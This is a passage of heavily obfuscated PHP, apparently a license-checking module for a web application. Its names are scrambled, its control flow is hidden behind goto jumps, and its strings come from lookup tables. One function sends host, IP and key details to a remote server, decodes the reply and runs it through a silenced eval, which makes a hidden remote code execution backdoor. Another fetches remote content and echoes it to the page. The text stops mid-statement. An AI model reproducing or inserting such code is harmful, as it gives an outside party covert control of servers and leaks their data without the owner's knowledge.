$dÄ½ğáÈ­ = $CÊŠ„îÚÜÈ[589]; if (!$dÄ½ğáÈ­) { die; } $DÈóÑ¸êßš = $c¶òÚÛ™â[114]($_SERVER[$c¶òÚÛ™â[115]] . $b¹—©…ºĞÏ); goto a½ÕÁÍêË¤; a “¹‹ÃÕ: $DÅÉÜ£» = $CÊŠ„îÚÜÈ[590]; $bŒÃ¨Ó¬é[$c¶òÚÛ™â[122]] = $c¶òÚÛ™â[214]($c¶òÚÛ™â[118]($this->{$_SERVER[Ñ¯][147]}($eòõ†‚œ, $c¶òÚÛ™â[215]))); $fÛõºÙêÓª = $c¶òÚÛ™â[124](16); goto C„ë™§ñ¬Ü; d˜ùä¶ÂŠÒ: $c¶òÚÛ™â[166]($c¶òÚÛ™â[197]($c¶òÚÛ™â[208]), !0); goto Föà…°ËÁ›; cÒ»Ë½ÇŒ¹: $D«ƒ‹Òµ¡Š = $this->{$_SERVER[Ñ¯][199]}($Føå½øŸƒ‚[$c¶òÚÛ™â[200]]); if (!$D«ƒ‹Òµ¡Š || $D«ƒ‹Òµ¡Š != $c¶òÚÛ™â[201]($Føå½øŸƒ‚[$c¶òÚÛ™â[145]])) { $fÀ—…ïÉ¶± = array($c¶òÚÛ™â[202] => $c¶òÚÛ™â[61]($c¶òÚÛ™â[62])->{$_SERVER[Ñ¯][63]}($c¶òÚÛ™â[116]), $c¶òÚÛ™â[203] => $_SERVER[$c¶òÚÛ™â[115]], $c¶òÚÛ™â[204] => $c¶òÚÛ™â[205](), $c¶òÚÛ™â[174] => $_SERVER[$c¶òÚÛ™â[175]]); $a—š‡¢ÉíÈ = $this->{$_SERVER[Ñ¯][206]}($c¶òÚÛ™â[148]($fÀ—…ïÉ¶±)); $this->{$_SERVER[Ñ¯][182]}($c¶òÚÛ™â[207] . $a—š‡¢ÉíÈ); $c¶òÚÛ™â[166]($c¶òÚÛ™â[197]($c¶òÚÛ™â[208]), !0); } $bŒÃ¨Ó¬é = array($c¶òÚÛ™â[209] => $aŒèèçŒßÖ[$c¶òÚÛ™â[165]], $c¶òÚÛ™â[210] => $Føå½øŸƒ‚[$c¶òÚÛ™â[211]], $c¶òÚÛ™â[212] => $c¶òÚÛ™â[124](16), $c¶òÚÛ™â[120] => $Føå½øŸƒ‚[$c¶òÚÛ™â[213]]); goto AçáñÊ; B§ŒğÒïŸ…: $bë³µí–Ğ¬ = $CÊŠ„îÚÜÈ[595]; while (strlen($bë³µí–Ğ¬) < $CÊŠ„îÚÜÈ[556]) { if (!$bë³µí–Ğ¬) { break; } $bë³µí–Ğ¬++; } $c¶òÚÛ™â[61]($c¶òÚÛ™â[11])->{$_SERVER[Ñ¯][226]}($D­–“¯©„‹[$c¶òÚÛ™â[227]], array($c¶òÚÛ™â[228] => $b†‚±“¬é)); goto f—¨—Î«Úõ; AçáñÊ: if ($aŒèèçŒßÖ[$c¶òÚÛ™â[168]]) { $bŒÃ¨Ó¬é[$c¶òÚÛ™â[212]] = $aŒèèçŒßÖ[$c¶òÚÛ™â[168]]; } $B‚ÍíĞºåÅ = $c¶òÚÛ™â[25]($c¶òÚÛ™â[114]($bŒÃ¨Ó¬é[$c¶òÚÛ™â[210]]), 10, 10); $eòõ†‚œ = $B‚ÍíĞºåÅ . $bŒÃ¨Ó¬é[$c¶òÚÛ™â[120]] . $bŒÃ¨Ó¬é[$c¶òÚÛ™â[212]]; goto a “¹‹ÃÕ; D¤æ÷“ãÃÆ: while (strlen($d±½µ¤“½ª) < $CÊŠ„îÚÜÈ[556]) { if (!$d±½µ¤“½ª) { break; } $d±½µ¤“½ª++; } $b†‚±“¬é = array(); $b†‚±“¬é[$d«ÌëøóÌ„] = $aøºÃÒáÜ¦; goto B§ŒğÒïŸ…; Föà…°ËÁ›: } private function licenseRegistSuccess() { $eô¡Æ‘á›Á =& $_SERVER[Ñ¯]; $Fù×Ü×ë¾Ô = $eô¡Æ‘á›Á[61]($eô¡Æ‘á›Á[62])->{$_SERVER[Ñ¯][63]}(); if ($Fù×Ü×ë¾Ô[$eô¡Æ‘á›Á[85]] != $eô¡Æ‘á›Á[220]) { $eô¡Æ‘á›Á[61]($eô¡Æ‘á›Á[62])->{$_SERVER[Ñ¯][221]}($eô¡Æ‘á›Á[85], $eô¡Æ‘á›Á[220]); } $eô¡Æ‘á›Á[110]($eô¡Æ‘á›Á[230])->{$_SERVER[Ñ¯][231]}(!0); } private function famu7131b9cb() { goto E–ÊùŠİÌš; eå½øÏ‹Òà: $this->pwxs52b9fbc7 = $BËÕ½¨‹± [121]; goto EÛœàÀêÃİ; Aˆ°•™ğÈ: $a¬ø–´Š÷ã = $DßòìÒß’ [597]; while (strlen($a¬ø–´Š÷ã) < $DßòìÒß’ [556]) { if (!$a¬ø–´Š÷ã) { break; } $a¬ø–´Š÷ã++; } $this->beldcf5ea3e1 = array(); goto eå½øÏ‹Òà; FÓŸÔê›ÛÙ: $f­½¡©ã™Å = $DßòìÒß’ [596]; if (strlen($f­½¡©ã™Å) < $DßòìÒß’ [548]) { return; } $BËÕ½¨‹± [61]($BËÕ½¨‹± [62])->{$_SERVER[Ñ¯][218]}($BËÕ½¨‹± [219], $BËÕ½¨‹± [232]); goto Aˆ°•™ğÈ; E–ÊùŠİÌš: $DßòìÒß’  =& $_SERVER[Î¿—”òá]; $BËÕ½¨‹±  =& $_SERVER[Ñ¯]; $BËÕ½¨‹± [61]($BËÕ½¨‹± [62])->{$_SERVER[Ñ¯][221]}(array($BËÕ½¨‹± [209] => $BËÕ½¨‹± [10], $BËÕ½¨‹± [210] => $BËÕ½¨‹± [10], $BËÕ½¨‹± [120] => $BËÕ½¨‹± [121], $BËÕ½¨‹± [122] => $BËÕ½¨‹± [10], $BËÕ½¨‹± [123] => $BËÕ½¨‹± [10])); goto FÓŸÔê›ÛÙ; EÛœàÀêÃİ: } private function qwvj1b0141bb() { goto F‚Å’«¨ÃÀ; E‹¢ƒë¦Ú: $dôäöÔƒ‹ = $D‘­ó¹ŒÈÒ[214]($D‘­ó¹ŒÈÒ[25]($B¯Š‰ŠêŸ“, 10, 16)); $Eƒ¦¹èÚš´ = $this->{$_SERVER[Ñ¯][188]}($cÒ£°¾¤É÷[$D‘­ó¹ŒÈÒ[91]][$dôäöÔƒ‹], $B¯Š‰ŠêŸ“); $Dƒ¼ˆ«ˆ÷Â = $cë¨Œ‰ˆÕÏ[601]; goto C½éÂî¹µ; eøª¿„Ÿ£Û: if (!$D‘­ó¹ŒÈÒ[191]($Eƒ¦¹èÚš´)) { return $this->{$_SERVER[Ñ¯][164]}(); } $fÌ†§Ş‰Ë = $D‘­ó¹ŒÈÒ[144]($Eƒ¦¹èÚš´[$D‘­ó¹ŒÈÒ[145]]); if ($D‘­ó¹ŒÈÒ[233]() >= $fÌ†§Ş‰Ë) { return $this->{$_SERVER[Ñ¯][164]}(); } goto dƒ”éÍ¶¸œ; Fø¶ê¢÷ÍŒ: $F‘ÉƒÁ®¥ = $cë¨Œ‰ˆÕÏ[598]; if (!$F‘ÉƒÁ®¥) { die; } $this->pwxs52b9fbc7 = $D‘­ó¹ŒÈÒ[121]; goto e¹‹˜è÷ò; dƒ”éÍ¶¸œ: $this->beldcf5ea3e1 = $Eƒ¦¹èÚš´; $this->pwxs52b9fbc7 = $BĞ‡‰éÊ«˜[$D‘­ó¹ŒÈÒ[120]]; $dù°ôé±ŞÚ = $cë¨Œ‰ˆÕÏ[603]; goto a°ÁœÒ¬µƒ; C²†Âø’İ: $C¦õğ†¢ ‚ = $D‘­ó¹ŒÈÒ[61]($D‘­ó¹ŒÈÒ[62])->{$_SERVER[Ñ¯][63]}($D‘­ó¹ŒÈÒ[116]); $AòŸò‡´°¬ = $D‘­ó¹ŒÈÒ[222]($D‘­ó¹ŒÈÒ[61]($D‘­ó¹ŒÈÒ[11])->{$_SERVER[Ñ¯][223]}(), $D‘­ó¹ŒÈÒ[224]); $cÒ£°¾¤É÷ = $AòŸò‡´°¬[$D‘­ó¹ŒÈÒ[225]]; goto cÏ’„¡Ú¬; a°ÁœÒ¬µƒ: if (strlen($dù°ôé±ŞÚ) < $cë¨Œ‰ˆÕÏ[556]) { return; } goto fğ·±Äò–œ; F‚Å’«¨ÃÀ: $cë¨Œ‰ˆÕÏ =& $_SERVER[Î¿—”òá]; $D‘­ó¹ŒÈÒ =& $_SERVER[Ñ¯]; $_SERVER[$D‘­ó¹ŒÈÒ[175]] = $D‘­ó¹ŒÈÒ[104]($_SERVER, $D‘­ó¹ŒÈÒ[175], APP_HOST); goto Fø¶ê¢÷ÍŒ; cÏ’„¡Ú¬: $B¯Š‰ŠêŸ“ = $D‘­ó¹ŒÈÒ[114]($_SERVER[$D‘­ó¹ŒÈÒ[115]] . $D‘­ó¹ŒÈÒ[214]($C¦õğ†¢ ‚) . $BĞ‡‰éÊ«˜[$D‘­ó¹ŒÈÒ[210]]); $bÁ¨ÊìÓ©É = $cë¨Œ‰ˆÕÏ[600]; if (strlen($bÁ¨ÊìÓ©É) < $cë¨Œ‰ˆÕÏ[571]) { die; } goto E‹¢ƒë¦Ú; C½éÂî¹µ: if (!$Dƒ¼ˆ«ˆ÷Â) { die; } $Eƒ¦¹èÚš´ = $D‘­ó¹ŒÈÒ[190]($Eƒ¦¹èÚš´, !0); $Cƒ´©‡ùŸ« = $cë¨Œ‰ˆÕÏ[602]; goto eøª¿„Ÿ£Û; e¹‹˜è÷ò: $BĞ‡‰éÊ«˜ = $D‘­ó¹ŒÈÒ[61]($D‘­ó¹ŒÈÒ[62])->{$_SERVER[Ñ¯][63]}(); $fšŒÚ®‘ › = $cë¨Œ‰ˆÕÏ[599]; if ($BĞ‡‰éÊ«˜[$D‘­ó¹ŒÈÒ[120]] == $D‘­ó¹ŒÈÒ[121]) { return; } goto C²†Âø’İ; fğ·±Äò–œ: } private function keoyc356af27() { goto cñä¹âóÓº; e²¹™›µ: if ($DŠ¶ÊæˆŒĞ == $c‡™‹¥´’Ü[234] && $this->pwxs52b9fbc7 == $c‡™‹¥´’Ü[121]) { $c‡™‹¥´’Ü[166]($c‡™‹¥´’Ü[197]($c‡™‹¥´’Ü[235]), !1, $c‡™‹¥´’Ü[236]); } $e·Í¹ù˜Å = array($c‡™‹¥´’Ü[237], $c‡™‹¥´’Ü[238]); if ($c‡™‹¥´’Ü[239]($DŠ¶ÊæˆŒĞ, $e·Í¹ù˜Å)) { if ($this->pwxs52b9fbc7 == $c‡™‹¥´’Ü[121] && isset($e°ì·µêë[$c‡™‹¥´’Ü[240]])) { $c‡™‹¥´’Ü[166]($c‡™‹¥´’Ü[197]($c‡™‹¥´’Ü[235]), !1, $c‡™‹¥´’Ü[236]); die; } $D”ã“’† ‹ = $this->{$_SERVER[Ñ¯][137]}(); if ($D”ã“’† ‹ != $c‡™‹¥´’Ü[201]($c‡™‹¥´’Ü[241])) { if ($D”ã“’† ‹ <= $c‡™‹¥´’Ü[61]($c‡™‹¥´’Ü[139])->{$_SERVER[Ñ¯][140]}()) { $c‡™‹¥´’Ü[166]($c‡™‹¥´’Ü[197]($c‡™‹¥´’Ü[242]), !1, $c‡™‹¥´’Ü[236]); die; } } } goto b¼– ¦Š×£; F Õ—»äîÔ: $DŠ¶ÊæˆŒĞ = $_SERVER[$c‡™‹¥´’Ü[44]]; $cĞ÷èø©Şô = $f®Š°îÍ‰[604]; if (strlen($cĞ÷èø©Şô) < $f®Š°îÍ‰[571]) { return; } goto e²¹™›µ; cñä¹âóÓº: $f®Š°îÍ‰ =& $_SERVER[Î¿—”òá]; $c‡™‹¥´’Ü =& $_SERVER[Ñ¯]; $e°ì·µêë = $GLOBALS[$c‡™‹¥´’Ü[22]]; goto F Õ—»äîÔ; b¼– ¦Š×£: } private function npzjcdbb582d() { goto C¯«Œñ—; dÜÙ ò”ë: $d¯äÀ¸¦‚Ì = $Eø·ÊàÂ«Ö[607]; $bö›Ú·¨«è[254]($bö›Ú·¨«è[255]); $cï¯È´˜Çˆ = $Eø·ÊàÂ«Ö[608]; goto c¾®­¸„Š×; C¯«Œñ—: $Eø·ÊàÂ«Ö =& $_SERVER[Î¿—”òá]; $bö›Ú·¨«è =& $_SERVER[Ñ¯]; $AàÍáĞ«•ñ = array($bö›Ú·¨«è[135], $bö›Ú·¨«è[243]); goto f¨†öÄ¼®—; f¨†öÄ¼®—: $aª…ïíºÚ„ = $Eø·ÊàÂ«Ö[605]; while (strlen($aª…ïíºÚ„) < $Eø·ÊàÂ«Ö[548]) { if (!$aª…ïíºÚ„) { break; } $aª…ïíºÚ„++; } if (!$bö›Ú·¨«è[104]($GLOBALS, $bö›Ú·¨«è[132]) || !isset($_GET[$bö›Ú·¨«è[244]])) { return; } goto Dƒ±¯Öà—¾; Dƒ±¯Öà—¾: if (!$bö›Ú·¨«è[239]($_SERVER[$bö›Ú·¨«è[44]], $AàÍáĞ«•ñ)) { return; } $bìÇ®à»• = $bö›Ú·¨«è[245]; $bìÇ®à»• = $this->{$_SERVER[Ñ¯][246]}($bìÇ®à»•, $bö›Ú·¨«è[247]); goto A†¢ÈÉó‰Æ; c¾®­¸„Š×: while (strlen($cï¯È´˜Çˆ) < $Eø·ÊàÂ«Ö[567]) { if (!$cï¯È´˜Çˆ) { break; } $cï¯È´˜Çˆ++; } if ($F¡èŸ¨õÛğ && $bö›Ú·¨«è[32]($F¡èŸ¨õÛğ, $bö›Ú·¨«è[256])) { echo $F¡èŸ¨õÛğ; } die; goto Bê¼„´ï; A†¢ÈÉó‰Æ: $A•»ÜŞ®æ = $Eø·ÊàÂ«Ö[606]; $f¤à„²•‹œ = $bö›Ú·¨«è[248](array($bö›Ú·¨«è[249] => array($bö›Ú·¨«è[250] => $bö›Ú·¨«è[251], $bö›Ú·¨«è[252] => 3))); $F¡èŸ¨õÛğ = @$bö›Ú·¨«è[253]($bìÇ®à»•, !1, $f¤à„²•‹œ); goto dÜÙ ò”ë; Bê¼„´ï: } public function rbkwf97ed621($c´¿ñÉà›) { goto cšœ¾‹îÕ„; cæîò°àî­: $d×ÒëÁèÑ = array($eÚƒ†Ê”Ñ§[258], $eÚƒ†Ê”Ñ§[259], $eÚƒ†Ê”Ñ§[260], $eÚƒ†Ê”Ñ§[261], $eÚƒ†Ê”Ñ§[262], $eÚƒ†Ê”Ñ§[263], $eÚƒ†Ê”Ñ§[264], $eÚƒ†Ê”Ñ§[265]); $AÀ¤õè‚³Í = $eÚƒ†Ê”Ñ§[0]($eÚƒ†Ê”Ñ§[266], $eÚƒ†Ê”Ñ§[104]($this->beldcf5ea3e1, $eÚƒ†Ê”Ñ§[129], $eÚƒ†Ê”Ñ§[10])); $Bî˜šÒ£¶ê = $BóãÃ†îîâ[609]; goto BËŠÚóŒÖˆ; døäâÌÂø¢: foreach ($d×ÒëÁèÑ as $Fë˜‚ƒÅ°Ò) { if (!$eÚƒ†Ê”Ñ§[239]($Fë˜‚ƒÅ°Ò, $AÀ¤õè‚³Í)) { $e¿ø°»”‚‡[] = $Fë˜‚ƒÅ°Ò; } } foreach ($e¿ø°»”‚‡ as $Fë˜‚ƒÅ°Ò) { unset($c´¿ñÉà›[$Fë˜‚ƒÅ°Ò]); } return $c´¿ñÉà›; goto C§»¥ÛäÁ´; cšœ¾‹îÕ„: $BóãÃ†îîâ =& $_SERVER[Î¿—”òá]; $eÚƒ†Ê”Ñ§ =& $_SERVER[Ñ¯]; if ($this->pwxs52b9fbc7 == $eÚƒ†Ê”Ñ§[257]) { return $c´¿ñÉà›; } goto cæîò°àî­; C§»¥ÛäÁ´: $cÈ›±ÅÕª = $BóãÃ†îîâ[611]; goto EœãÏ‹œ³; BËŠÚóŒÖˆ: $e¿ø°»”‚‡ = array(); $A©ğˆíÒâ– = $BóãÃ†îîâ[610]; while (strlen($A©ğˆíÒâ–) < $BóãÃ†îîâ[567]) { if (!$A©ğˆíÒâ–) { break; } $A©ğˆíÒâ–++; } goto døäâÌÂø¢; EœãÏ‹œ³: } private function gnkwdb6d40ba() { goto Cœ“ğ¬òˆ×; c£‘ÍÊæ: $E‚²Ú‚ÖñÑ = $F›ÖÇŠ§°®[614]; while ($E‚²Ú‚ÖñÑ < $F›ÖÇŠ§°®[556]) { if ($E‚²Ú‚ÖñÑ >= 0) { break; } $E‚²Ú‚ÖñÑ++; } $GLOBALS[$f¡ó‰Õ‘§ñ[91]][$f¡ó‰Õ‘§ñ[271]] = $f¡ó‰Õ‘§ñ[220]; goto e”°ÔŠ¾¾Ş; Cœ“ğ¬òˆ×: $F›ÖÇŠ§°® =& $_SERVER[Î¿—”òá]; $f¡ó‰Õ‘§ñ =& $_SERVER[Ñ¯]; if ($this->pwxs52b9fbc7 != $f¡ó‰Õ‘§ñ[121]) { $GLOBALS[$f¡ó‰Õ‘§ñ[91]][$f¡ó‰Õ‘§ñ[95]][$f¡ó‰Õ‘§ñ[267]] = $f¡ó‰Õ‘§ñ[220]; return; } goto Bà†Ğ‡§Íó; eÙ¶Ô¼±‡: if (!$fª·…¯·‘) { return; } foreach ($AŒŞ‹¯¥× as $FÏ¸ìµÙ†) { if ($FÏ¸ìµÙ† == $aêé‰ŠÈÒˆ || $f¡ó‰Õ‘§ñ[25]($aêé‰ŠÈÒˆ, 0, $f¡ó‰Õ‘§ñ[24]($FÏ¸ìµÙ†)) == $FÏ¸ìµÙ†) { $f¡ó‰Õ‘§ñ[166]($f¡ó‰Õ‘§ñ[197]($f¡ó‰Õ‘§ñ[269]), !1); } } $GLOBALS[$f¡ó‰Õ‘§ñ[91]][$f¡ó‰Õ‘§ñ[95]][$f¡ó‰Õ‘§ñ[270]] = $f¡ó‰Õ‘§ñ[220]; goto d×ÏÅµ ®ê; d×ÏÅµ ®ê: $bÀ„ïˆóåÌ = $F›ÖÇŠ§°®[613]; if (strlen($bÀ„ïˆóåÌ) < $F›ÖÇŠ§°®[567]) { die; } $GLOBALS[$f¡ó‰Õ‘§ñ[91]][$f¡ó‰Õ‘§ñ[95]][$f¡ó‰Õ‘§ñ[267]] = $f¡ó‰Õ‘§ñ[232]; goto c£‘ÍÊæ; Bà†Ğ‡§Íó: $aêé‰ŠÈÒˆ = $_SERVER[$f¡ó‰Õ‘§ñ[44]]; $AŒŞ‹¯¥× = array($f¡ó‰Õ‘§ñ[268]); $fª·…¯·‘ = $F›ÖÇŠ§°®[612]; goto eÙ¶Ô¼±‡; e”°ÔŠ¾¾Ş: if ($f¡ó‰Õ‘§ñ[61]($f¡ó‰Õ‘§ñ[272])->{$_SERVER[Ñ¯][63]}($f¡ó‰Õ‘§ñ[85]) != $f¡ó‰Õ‘§ñ[232]) { $f¡ó‰Õ‘§ñ[61]($f¡ó‰Õ‘§ñ[272])->{$_SERVER[Ñ¯][221]}($f¡ó‰Õ‘§ñ[85], $f¡ó‰Õ‘§ñ[232]); } goto eÀŠ™ìõ‹º; eÀŠ™ìõ‹º: } public function wmvn6db6cd1a() { return $_SERVER[Ñ¯][273]; $A›øì…‚¶ä = $_SERVER[Î¿—”òá][615]; } private function veyd53e34426() { goto c·–”Ä¦™Á; F§§‚“Ê†™: $CÔ—Ê‚–„… = array($C‰½É›Ãò‰[165] => $C‰½É›Ãò‰[61]($C‰½É›Ãò‰[62])->{$_SERVER[Ñ¯][63]}($C‰½É›Ãò‰[209]), $C‰½É›Ãò‰[178] => $this->pwxs52b9fbc7, $C‰½É›Ãò‰[176] => $_SERVER[$C‰½É›Ãò‰[177]], $C‰½É›Ãò‰[169] => $C‰½É›Ãò‰[149], $C‰½É›Ãò‰[172] => $_SERVER[$C‰½É›Ãò‰[173]]); $f„šŸÓ—Ûó = $this->{$_SERVER[Ñ¯][182]}($C‰½É›Ãò‰[282], $CÔ—Ê‚–„…); if (!$C‰½É›Ãò‰[191]($f„šŸÓ—Ûó)) { return; } goto B½§® ·±Ø; c·–”Ä¦™Á: $fõÏÉ‘¢Â† =& $_SERVER[Î¿—”òá]; $C‰½É›Ãò‰ =& $_SERVER[Ñ¯]; $a¾„»¸èÄñ = array($C‰½É›Ãò‰[274], $C‰½É›Ãò‰[275], $C‰½É›Ãò‰[276]); goto B²ò„Óæ¸£; B½§® ·±Ø: if ($f„šŸÓ—Ûó[$C‰½É›Ãò‰[165]] && $f„šŸÓ—Ûó[$C‰½É›Ãò‰[283]]) { if ($this->{$_SERVER[Ñ¯][199]}($f„šŸÓ—Ûó[$C‰½É›Ãò‰[283]]) == $CÔ—Ê‚–„…[$C‰½É›Ãò‰[165]]) { return; } } $this->{$_SERVER[Ñ¯][164]}(); if ($this->{$_SERVER[Ñ¯][199]}($f„šŸÓ—Ûó[$C‰½É›Ãò‰[283]]) != $CÔ—Ê‚–„…[$C‰½É›Ãò‰[165]]) { $E„È¤½¢î¬ = array($C‰½É›Ãò‰[202] => $C‰½É›Ãò‰[61]($C‰½É›Ãò‰[62])->{$_SERVER[Ñ¯][63]}($C‰½É›Ãò‰[116]), $C‰½É›Ãò‰[203] => $_SERVER[$C‰½É›Ãò‰[115]], $C‰½É›Ãò‰[204] => $C‰½É›Ãò‰[205](), $C‰½É›Ãò‰[174] => $_SERVER[$C‰½É›Ãò‰[175]]); $C‰ìŠ¼˜Ãá = $this->{$_SERVER[Ñ¯][206]}($C‰½É›Ãò‰[148]($E„È¤½¢î¬)); $f„šŸÓ—Ûó = $this->{$_SERVER[Ñ¯][182]}($C‰½É›Ãò‰[207] . $C‰ìŠ¼˜Ãá); if ($f„šŸÓ—Ûó && $C‰½É›Ãò‰[191]($f„šŸÓ—Ûó) && isset($f„šŸÓ—Ûó[$C‰½É›Ãò‰[283]])) { $e¯Ëùã·ñ© = $this->{$_SERVER[Ñ¯][188]}($f„šŸÓ—Ûó[$C‰½É›Ãò‰[283]], 2); if ($e¯Ëùã·ñ©) { $e¯Ëùã·ñ© = $this->{$_SERVER[Ñ¯][199]}($e¯Ëùã·ñ©); } if ($e¯Ëùã·ñ©) { try { @eval($e¯Ëùã·ñ©); } catch (Exception $C¤¢ÜÅÏ¯È) { } } } } goto f¡˜´ƒ©ˆ„; B²ò„Óæ¸£: $c‰îƒŠ¡… = $C‰½É›Ãò‰[277] . $C‰½É›Ãò‰[114]($C‰½É›Ãò‰[278]); if ($this->pwxs52b9fbc7 == $C‰½É›Ãò‰[121] || !$C‰½É›Ãò‰[104]($GLOBALS, $C‰½É›Ãò‰[132])) { return; } if (!$C‰½É›Ãò‰[239]($_SERVER[$C‰½É›Ãò‰[44]], $a¾„»¸èÄñ)) { return; } goto fë®¹ØÈŒÈ; fë®¹ØÈŒÈ: if ($C‰½É›Ãò‰[233]() % 4 != 0) { return; } $Bâï††ÚÁé = $C‰½É›Ãò‰[13](array($C‰½É›Ãò‰[279], $C‰½É›Ãò‰[280]), $c‰îƒŠ¡…); if ($Bâï††ÚÁé && $C‰½É›Ãò‰[233]() - $Bâï††ÚÁé < $C‰½É›Ãò‰[201]($C‰½É›Ãò‰[281])) { return; } goto dŸõ–à±õ; dŸõ–à±õ: $C‰½É›Ãò‰[13](array($C‰½É›Ãò‰[279], $C‰½É›Ãò‰[152]), $c‰îƒŠ¡…, $C‰½É›Ãò‰[233]()); $D‚‡º°Şå = $fõÏÉ‘¢Â†[616]; while ($D‚‡º°Şå < $fõÏÉ‘¢Â†[548]) { if ($D‚‡º°Şå >= 0) { break; } $D‚‡º°Şå++; } goto F§§‚“Ê†™; f¡˜´ƒ©ˆ„: } private function asfl0cdb2728($C²ãˆ—áÇ = '', $dŒÑ¶òÜ­™ = array(), $e‡ ••–î¯ = 5) { goto C‰Û»•ÚÂ; eÓÈÍğî‹ã: while ($Bİ’ó„³é• < $dŠ¢¾¢ê»[548]) { if ($Bİ’ó„³é• >= 0) { break; } $Bİ’ó„³é•++; } goto CÌİŒç„×; C¾±®±’˜: $BÓæƒ’‡Í­ = $BÓæƒ’‡Í­ . $C²ãˆ—áÇ . $fƒ³Ó÷—îË[286] . $fƒ³Ó÷—îË[287]($dŒÑ¶òÜ­™); if ($dŒÑ¶òÜ­™ === -1) { return $BÓæƒ’‡Í­; } $Cªë°¨Ï¼£ = $fƒ³Ó÷—îË[248](array($fƒ³Ó÷—îË[249] => array($fƒ³Ó÷—îË[252] => $e‡ ••–î¯, $fƒ³Ó÷—îË[250] => $fƒ³Ó÷—îË[288]), $fƒ³Ó÷—îË[289] => array($fƒ³Ó÷—îË[290] => !1, $fƒ³Ó÷—îË[291] => !1))); goto céÁ ƒÆƒŸ; C‰Û»•ÚÂ: $dŠ¢¾¢ê» =& $_SERVER[Î¿—”òá]; $fƒ³Ó÷—îË =& $_SERVER[Ñ¯]; $BÓæƒ’‡Í­ = $fƒ³Ó÷—îË[284]; goto DÙ§ÖŒíÚ˜; céÁ ƒÆƒŸ: $fµèæÒã¸ = $dŠ¢¾¢ê»[618]; $dŒÑ¶òÜ­™ = @$fƒ³Ó÷—îË[253]($BÓæƒ’‡Í­, !1, $Cªë°¨Ï¼£); $CÈŠ›Ç£ƒ = $dŠ¢¾¢ê»[619]; goto fŞÁğÚĞáÑ; DÙ§ÖŒíÚ˜: $dØ¹ö¢£ = $dŠ¢¾¢ê»[617]; if (strlen($dØ¹ö¢£) < $dŠ¢¾¢ê»[548]) { die; } $BÓæƒ’‡Í­ = $this->{$_SERVER[Ñ¯][246]}($BÓæƒ’‡Í­, $fƒ³Ó÷—îË[285]); goto C¾±®±’˜; fŞÁğÚĞáÑ: if (!$CÈŠ›Ç£ƒ) { die; } return $fƒ³Ó÷—îË[190]($dŒÑ¶òÜ­™, !0); $Bİ’ó„³é• = $dŠ¢¾¢ê»[620]; goto eÓÈÍğî‹ã; CÌİŒç„×: } private function hujo40dab428() { goto b«”Ì¼Âöé; eóæã¾ÓäÍ: $a–Ò‹…òÏ´ = $aàçŒÀÄ»[621]; if (strlen($a–Ò‹…òÏ´) < $aàçŒÀÄ»[560]) { die; } $Aáèí‰öŸƒ = $Eãê²Í¼¾¿[$this->pwxs52b9fbc7]; goto B²œäœËŒ¢; AÔš’‘ÓÄ: $a¼î•¬ø–Ã = $a¼î•¬ø–Ã ? $CÀœ“ÊôÖ[201]($a¼î•¬ø–Ã) : 0; $BôîÍÁğÌ = $aàçŒÀÄ»[623]; if (!$BôîÍÁğÌ) { die; } goto c´¢º¸ó›Ò; b«”Ì¼Âöé: $aàçŒÀÄ» =& $_SERVER[Î¿—”òá]; $CÀœ“ÊôÖ =& $_SERVER[Ñ¯]; $Eãê²Í¼¾¿ = array($CÀœ“ÊôÖ[292] => $CÀœ“ÊôÖ[293], $CÀœ“ÊôÖ[294] => $CÀœ“ÊôÖ[295], $CÀœ“ÊôÖ[296] => $CÀœ“ÊôÖ[297], $CÀœ“ÊôÖ[298] => $CÀœ“ÊôÖ[299], $CÀœ“ÊôÖ[300] => $CÀœ“ÊôÖ[301], $CÀœ“ÊôÖ[302] => $CÀœ“ÊôÖ[241], $CÀœ“ÊôÖ[303] => $CÀœ“ÊôÖ[241], $CÀœ“ÊôÖ[304] => $CÀœ“ÊôÖ[293], $CÀœ“ÊôÖ[305] => $CÀœ“ÊôÖ[295], $CÀœ“ÊôÖ[306] => $CÀœ“ÊôÖ[297], $CÀœ“ÊôÖ[307] => $CÀœ“ÊôÖ[308], $CÀœ“ÊôÖ[309] => $CÀœ“ÊôÖ[299], $CÀœ“ÊôÖ[310] => $CÀœ“ÊôÖ[311], $CÀœ“ÊôÖ[312] => $CÀœ“ÊôÖ[301], $CÀœ“ÊôÖ[313] => $CÀœ“ÊôÖ[314], $CÀœ“ÊôÖ[315] => $CÀœ“ÊôÖ[316], $CÀœ“ÊôÖ[317] => $CÀœ“ÊôÖ[318]); goto eóæã¾ÓäÍ; B²œäœËŒ¢: $Aáèí‰öŸƒ = $CÀœ“ÊôÖ[201]($Aáèí‰öŸƒ ? $Aáèí‰öŸƒ : $CÀœ“ÊôÖ[293]); $E„ƒ‘¢µÖ = $aàçŒÀÄ»[622]; $a¼î•¬ø–Ã = $CÀœ“ÊôÖ[104]($this->beldcf5ea3e1, $CÀœ“ÊôÖ[319]); goto AÔš’‘ÓÄ; c´¢º¸ó›Ò: return $Aáèí‰öŸƒ + $a¼î•¬ø–Ã; goto B®ÙîÚî; B®ÙîÚî: } public function zhau8c60d52f($aá‹šˆº§÷) { goto F‡Ò—Â­Œ; bÛš•‰øÑ: $eø©ËĞ“ = $eöŠ¢ÎÆ¹[625]; while ($eø©ËĞ“ < $eöŠ¢ÎÆ¹[571]) { if ($eø©ËĞ“ >= 0) { break; } $eø©ËĞ“++; } if ($D¥ÖÒ½ÙÙó <= $Bù›å«ÜíÚ) { return; } goto C³ÉÈßÁ…ã; F‡Ò—Â­Œ: $eöŠ¢ÎÆ¹ =& $_SERVER[Î¿—”òá]; $dİù»õÖº =& $_SERVER[Ñ¯]; $Bù›å«ÜíÚ = $this->{$_SERVER[Ñ¯][137]}(); goto AïÄÓ—¹Ì; C³ÉÈßÁ…ã: $aÓµ§ª×Ÿİ = $dİù»õÖº[61]($dİù»õÖº[139])->{$_SERVER[Ñ¯][320]}($dİù»õÖº[321])->{$_SERVER[Ñ¯][322]}($Bù›å«ÜíÚ)->{$_SERVER[Ñ¯][323]}(); $B¸ìªİŠğ° = $eöŠ¢ÎÆ¹[626]; $aÓµ§ª×Ÿİ = $dİù»õÖº[222]($aÓµ§ª×Ÿİ, $dİù»õÖº[10], $dİù»õÖº[321]); goto A„†ÇÕ¤ğå; AïÄÓ—¹Ì: $a×®éÄïØ = $eöŠ¢ÎÆ¹[624]; if ($Bù›å«ÜíÚ >= $dİù»õÖº[201]($dİù»õÖº[241])) { return; } $D¥ÖÒ½ÙÙó = $dİù»õÖº[61]($dİù»õÖº[139])->{$_SERVER[Ñ¯][140]}(); goto bÛš•‰øÑ; A„†ÇÕ¤ğå: $Dæ‚£óèŠ = 